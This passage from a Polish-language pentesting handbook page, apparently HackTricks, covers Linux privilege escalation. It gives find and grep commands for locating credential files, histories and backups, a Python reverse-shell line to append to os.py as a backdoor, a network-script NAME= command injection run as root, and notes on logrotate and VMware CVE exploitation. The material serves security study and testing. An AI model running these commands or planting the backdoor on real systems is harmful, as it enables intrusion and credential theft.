find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki baz danych Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/pliki binarne w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), który wyszukuje **kilka potencjalnych plików mogących zawierać hasła**.\
**Innym interesującym narzędziem**, którego możesz do tego użyć, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source używana do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze z systemem Windows, Linux lub Mac.

### Dzienniki

Jeśli możesz odczytywać dzienniki, możesz być w stanie znaleźć **interesujące/poufne informacje w ich treści**. Im bardziej nietypowy jest dziennik, tym będzie prawdopodobnie bardziej interesujący.\
Ponadto niektóre nieprawidłowo skonfigurowane (z backdoorem?) **dzienniki audytu** mogą umożliwiać **zapisywanie haseł** w dziennikach audytu, jak wyjaśniono w tym poście: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **odczytywać logi**, grupa [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Pliki powłoki
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś również sprawdzić pliki zawierające słowo "**password**" w swojej **nazwie** lub wewnątrz **treści**, a także sprawdzić logi pod kątem adresów IP i adresów e-mail oraz użyć regexps dla hashy.\
Nie będę tutaj opisywać, jak to wszystko zrobić, ale jeśli Cię to interesuje, możesz sprawdzić ostatnie kontrole wykonywane przez [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki z możliwością zapisu

### Python library hijacking

Jeśli wiesz, **z jakiego miejsca** zostanie wykonany skrypt Pythona i **możesz zapisywać w** tym folderze lub **modyfikować biblioteki Pythona**, możesz zmodyfikować bibliotekę systemową i umieścić w niej backdoor (jeśli możesz zapisywać w miejscu, z którego zostanie wykonany skrypt Pythona, skopiuj i wklej bibliotekę os.py).

Aby **umieścić backdoor w bibliotece**, dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Wykorzystanie logrotate

Podatność w `logrotate` pozwala użytkownikom posiadającym **uprawnienia do zapisu** do pliku logu lub jego katalogów nadrzędnych potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może zostać zmanipulowany w celu wykonania dowolnych plików, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzanie uprawnień nie tylko w _/var/log_, ale także w każdym katalogu, w którym stosowana jest rotacja logów.

> [!TIP]
> Ta podatność dotyczy wersji `logrotate` `3.18.0` i starszych

Bardziej szczegółowe informacje o podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc za każdym razem, gdy znajdziesz możliwość modyfikowania logów, sprawdź, kto zarządza tymi logami, oraz czy możesz uzyskać eskalację uprawnień, zastępując logi symlinkami.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odnośnik do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Jeśli z dowolnego powodu użytkownik może **zapisać** skrypt `ifcf-<whatever>` w _/etc/sysconfig/network-scripts_ **lub** może **zmodyfikować** istniejący skrypt, wtedy twój **system is pwned**.<sup>[[20]](#references)</sup>

Skrypty sieciowe, na przykład _ifcg-eth0_, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak w systemie Linux są \~sourced\~ przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest prawidłowo obsługiwany. Jeśli nazwa zawiera **białą/spację**, system próbuje wykonać część znajdującą się po **białej spacji**. Oznacza to, że **wszystko po pierwszej białej spacji jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na spację między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami Linux**. Obejmuje on skrypty do `start`, `stop`, `restart`, a czasami także `reload` usług. Można je wykonywać bezpośrednio lub za pośrednictwem dowiązań symbolicznych znajdujących się w `/etc/rc?.d/`. Alternatywną ścieżką w systemach Redhat jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, który wykorzystuje pliki konfiguracyjne do zadań związanych z zarządzaniem usługami. Pomimo przejścia na Upstart skrypty SysVinit są nadal używane razem z konfiguracjami Upstart dzięki warstwie zgodności w Upstart.

**systemd** jest nowoczesnym menedżerem inicjalizacji i usług, oferującym zaawansowane funkcje, takie jak uruchamianie daemonów na żądanie, zarządzanie automatycznym montowaniem oraz migawki stanu systemu. Porządkuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych oraz w `/etc/systemd/system/` dla modyfikacji administratora, usprawniając proces administracji systemem.<sup>[[21]](#references)</sup>

## Inne triki

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks często podpinają się do syscall, aby udostępnić uprzywilejowane funkcje kernela managerowi userspace. Słabe uwierzytelnianie managera (np. sprawdzanie sygnatur oparte na kolejności FD lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod managera i uzyskanie uprawnień root na urządzeniach, które już mają root. Więcej informacji oraz szczegóły exploitation znajdziesz tutaj:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Oparte na regex wyszukiwanie usług w VMware Tools/Aria Operations może wyodrębnić ścieżkę binarną z linii poleceń procesów i wykonać ją z parametrem -v w uprzywilejowanym kontekście. Liberalne wzorce (np. wykorzystujące \S) mogą dopasować listenery umieszczone przez attackera w lokalizacjach z prawem zapisu (np. /tmp/httpd), prowadząc do wykonania jako root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Więcej informacji oraz uogólniony wzorzec mający zastosowanie do innych stosów discovery/monitoring znajdziesz tutaj:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opcja -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (eskalacja przez Crontab UI, ponowne użycie danych uwierzytelniających zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: sfałszowany payload .text_sig dla monitora uruchamianego przez cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: obejście Neighborhood Watch (przejęcie sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Podstawy Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Przewodnik po Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Atak i obrona: techniki Linux Privilege Escalation z 2016 roku](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Nikt nie spodziewa się wykonania polecenia!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – omówienie ćwiczeń laboratoryjnych - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: porady i triki dotyczące Linux Privilege Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: narzędzie do enumeracji i Privilege Escalation w systemie Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Czym jest Socket?](https://www.linux.com/news/what-socket/)
- [15] [Omówienie Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Uzyskaj dostęp do D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Pliki wykonywalne SUID Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo część 2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jak zarządzać ACL w systemie Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root przez network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Czym jest systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection przez logi, cały łańcuch)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Podręcznik GNU Bash – BASH_ENV (plik startowy non-interactive)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (kopiowanie przez cron pg_basebackup → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Nazywasz to, VMware podnosi jego uprawnienia (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 i CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – katalogi repozytoriów PYC](https://peps.python.org/pep-3147/)
- [32] [Dokumentacja Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet użytkownika @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Logowanie haseł w systemie Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Szczegóły race condition w logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
